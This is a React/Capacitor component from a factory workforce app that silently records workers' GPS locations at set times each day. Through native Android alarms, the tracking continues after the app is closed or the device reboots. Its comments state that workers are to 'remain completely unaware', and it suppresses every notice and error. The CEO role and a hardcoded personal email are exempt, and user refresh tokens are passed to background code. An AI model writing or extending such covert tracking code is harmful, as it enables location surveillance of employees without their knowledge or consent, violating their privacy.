import React, { useEffect, useRef } from 'react';
import { Capacitor } from '@capacitor/core';
import { App as CapApp } from '@capacitor/app';
import firebaseConfig from '../../firebase-applet-config.json';
import { useAuth } from './AuthProvider';
import { getAveragedGpsPosition } from '../lib/geolocationHelper';
import {
  clearNativeBackgroundGpsSchedule,
  requestNativeBackgroundPermissions,
  syncNativeBackgroundGpsConfig
} from '../lib/nativeBgGpsBridge';
import { getCachedFactoryJigsAndCalibration } from '../services/firestoreCacheService';
import {
  DEFAULT_FACTORY_JIGS,
  FACTORY_CALIBRATION_DOC_ID,
  findMatchingTrackingSlot,
  getLocalDateString,
  getMsUntilNextTrackingSlot,
  recordWorkerScheduledSlotGps,
  resolveWorkerAssignedJigId
} from '../services/factoryTrackingService';

const getSlotLockKey = (uid: string, dateStr: string, slot: string) =>
  `factory_gps_slot_done_${uid}_${dateStr}_${slot}`;

const isSlotAlreadyRecordedLocally = (uid: string, dateStr: string, slot: string): boolean => {
  try {
    return localStorage.getItem(getSlotLockKey(uid, dateStr, slot)) === '1';
  } catch {
    return false;
  }
};

const markSlotRecordedLocally = (uid: string, dateStr: string, slot: string) => {
  try {
    localStorage.setItem(getSlotLockKey(uid, dateStr, slot), '1');
  } catch {
    // ignore storage quota errors
  }
};

/**
 * Headless background scheduler that silently records workers' averaged GPS positions
 * right on each Factory 7 measurement time slot (08:20, 09:45, 10:15, 11:45, 13:10, 14:45, 15:15, 17:45).
 * On Android APK, it also arms native AlarmManager + JobService so measurements continue silently
 * even when the app is completely closed/killed or after device reboot.
 * Renders zero UI and produces zero toasts or alerts so workers remain completely unaware.
 */
export const SilentFactoryGpsTracker: React.FC = () => {
  const { user, profile } = useAuth();
  const inFlightSlotRef = useRef<string | null>(null);
  const completedSessionSlotsRef = useRef<Set<string>>(new Set());
  const requestedPermsUidRef = useRef<string | null>(null);

  const isCEO = Boolean(
    user &&
      profile &&
      (profile.role === 'CEO' || profile.email?.toLowerCase() === 'tjrwnfjqm1@gmail.com')
  );

  // Sync or clear Android native background AlarmManager scheduler
  useEffect(() => {
    if (!user || !profile || isCEO) {
      clearNativeBackgroundGpsSchedule().catch(() => {});
      return;
    }

    if (!Capacitor.isNativePlatform()) return;

    let cancelled = false;

    const syncNativeSchedule = async () => {
      try {
        const { calibration, jigs } = await getCachedFactoryJigsAndCalibration(
          FACTORY_CALIBRATION_DOC_ID,
          DEFAULT_FACTORY_JIGS
        );
        if (cancelled) return;

        const assignedJigId = resolveWorkerAssignedJigId(
          {
            assignedJigId: profile.assignedJigId,
            departmentName: profile.departmentName
          },
          jigs
        );

        await syncNativeBackgroundGpsConfig({
          enabled: true,
          workerUid: profile.uid,
          workerName: profile.displayName || '현장작업자',
          employeeId: profile.employeeId || 'EMP',
          teamName: profile.departmentName || '현장팀',
          jobRole: profile.jobRole || '작업자',
          assignedJigId,
          refreshToken: user.refreshToken || '',
          firebaseApiKey: firebaseConfig.apiKey || '',
          firebaseProjectId: firebaseConfig.projectId || '',
          firestoreDatabaseId: firebaseConfig.firestoreDatabaseId || '(default)',
          calibrationJson: calibration ? JSON.stringify(calibration) : '',
          jigsJson: JSON.stringify(jigs)
        });
      } catch {
        // Silent failure: never surface errors to workers
      }
    };

    let didInitialRun = false;
    const ensurePermsAndSync = async () => {
      if (cancelled || didInitialRun) return;
      didInitialRun = true;
      if (requestedPermsUidRef.current !== profile.uid) {
        requestedPermsUidRef.current = profile.uid;
        await requestNativeBackgroundPermissions().catch(() => null);
      }
      if (!cancelled) {
        await syncNativeSchedule();
      }
    };

    const initialTimerId = window.setTimeout(() => {
      ensurePermsAndSync();
    }, 1200);

    const intervalId = window.setInterval(syncNativeSchedule, 30 * 60 * 1000);

    const handleResumeSync = () => {
      if (!document.hidden && !cancelled) {
        syncNativeSchedule();
      }
    };
    document.addEventListener('visibilitychange', handleResumeSync);

    let capSyncListener: any = null;
    CapApp.addListener('appStateChange', ({ isActive }) => {
      if (isActive && !cancelled) {
        syncNativeSchedule();
      }
    })
      .then((l) => {
        if (!cancelled) capSyncListener = l;
        else l.remove();
      })
      .catch(() => {});

    return () => {
      cancelled = true;
      window.clearTimeout(initialTimerId);
      window.clearInterval(intervalId);
      document.removeEventListener('visibilitychange', handleResumeSync);
      if (capSyncListener && typeof capSyncListener.remove === 'function') {
        capSyncListener.remove();
      }
    };
  }, [
    user,
    profile?.uid,
    profile?.displayName,
    profile?.employeeId,
    profile?.departmentName,
    profile?.jobRole,
    profile?.assignedJigId,
    isCEO
  ]);

  // Foreground / active JS scheduler (works across Web + APK resume + complements native alarms)
  useEffect(() => {
    if (!user || !profile || isCEO) return;

    let isMounted = true;
    let exactTimeoutId: number | null = null;
    let pollIntervalId: number | null = null;
    let capAppListener: any = null;

    const runScheduledCheck = async () => {
      if (!isMounted) return;

      const now = new Date();
      const matched = findMatchingTrackingSlot(now, 4);
      if (!matched) return;

      const dateStr = getLocalDateString(now);
      const lockId = `${profile.uid}_${dateStr}_${matched.slot}`;

      if (
        inFlightSlotRef.current === lockId ||
        completedSessionSlotsRef.current.has(lockId) ||
        isSlotAlreadyRecordedLocally(profile.uid, dateStr, matched.slot)
      ) {
        return;
      }

      inFlightSlotRef.current = lockId;

      try {
        const averaged = await getAveragedGpsPosition({
          attempts: 5,
          minSamples: 2,
          intervalMs: 1200,
          timeoutPerAttemptMs: 8000,
          silent: true
        });

        if (!isMounted) return;

        await recordWorkerScheduledSlotGps({
          workerUid: profile.uid,
          workerName: profile.displayName || '현장작업자',
          employeeId: profile.employeeId || 'EMP',
          teamName: profile.departmentName || '현장팀',
          jobRole: profile.jobRole || '작업자',
          assignedJigId: profile.assignedJigId,
          dateStr,
          slot: matched.slot,
          slotIndex: matched.slotIndex,
          lat: averaged.lat,
          lng: averaged.lng,
          accuracy: averaged.accuracy,
          sampleCount: averaged.sampleCount,
          spreadMeters: averaged.spreadMeters
        });

        completedSessionSlotsRef.current.add(lockId);
        markSlotRecordedLocally(profile.uid, dateStr, matched.slot);
      } catch {
        // Silent failure: workers must never see errors, prompts, or tracking notices
      } finally {
        if (inFlightSlotRef.current === lockId) {
          inFlightSlotRef.current = null;
        }
      }
    };

    const armExactNextTimer = () => {
      if (exactTimeoutId !== null) {
        window.clearTimeout(exactTimeoutId);
        exactTimeoutId = null;
      }
      const next = getMsUntilNextTrackingSlot(new Date());
      if (next) {
        exactTimeoutId = window.setTimeout(() => {
          runScheduledCheck().finally(() => {
            if (isMounted) armExactNextTimer();
          });
        }, next.msUntil + 250);
      }
    };

    runScheduledCheck();
    armExactNextTimer();

    pollIntervalId = window.setInterval(() => {
      runScheduledCheck();
    }, 15000);

    const handleVisibilityOrFocus = () => {
      if (!document.hidden) {
        runScheduledCheck();
        armExactNextTimer();
      }
    };
    document.addEventListener('visibilitychange', handleVisibilityOrFocus);
    window.addEventListener('focus', handleVisibilityOrFocus);

    if (Capacitor.isNativePlatform()) {
      CapApp.addListener('appStateChange', ({ isActive }) => {
        if (!isMounted || !isActive) return;
        runScheduledCheck();
        armExactNextTimer();
      })
        .then((l) => {
          if (isMounted) capAppListener = l;
          else l.remove();
        })
        .catch(() => {});
    }

    return () => {
      isMounted = false;
      if (exactTimeoutId !== null) window.clearTimeout(exactTimeoutId);
      if (pollIntervalId !== null) window.clearInterval(pollIntervalId);
      document.removeEventListener('visibilitychange', handleVisibilityOrFocus);
      window.removeEventListener('focus', handleVisibilityOrFocus);
      if (capAppListener && typeof capAppListener.remove === 'function') {
        capAppListener.remove();
      }
    };
  }, [
    user?.uid,
    profile?.uid,
    profile?.displayName,
    profile?.employeeId,
    profile?.departmentName,
    profile?.jobRole,
    profile?.assignedJigId,
    isCEO
  ]);

  return null;
};

export default SilentFactoryGpsTracker;
